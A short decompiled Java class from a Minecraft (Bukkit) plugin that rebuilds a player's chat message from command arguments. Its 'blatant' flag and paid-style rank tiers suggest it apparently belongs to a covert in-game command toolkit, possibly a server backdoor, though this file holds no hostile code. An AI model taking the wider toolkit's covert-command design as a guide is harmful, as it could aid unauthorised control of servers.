package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "chat",
   description = "Send a message to the chat",
   blatant = false,
   rank = Rank.FREE,
   aliases = {"c"}
)
public class ChatCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      StringBuilder var4 = new StringBuilder();

      for(String var8 : var3) {
         var4.append(var8).append(" ");
      }

      var1.setMessage(var4.toString());
      var1.setCancelled(false);
   }

   public ChatCommand() {
   }
}
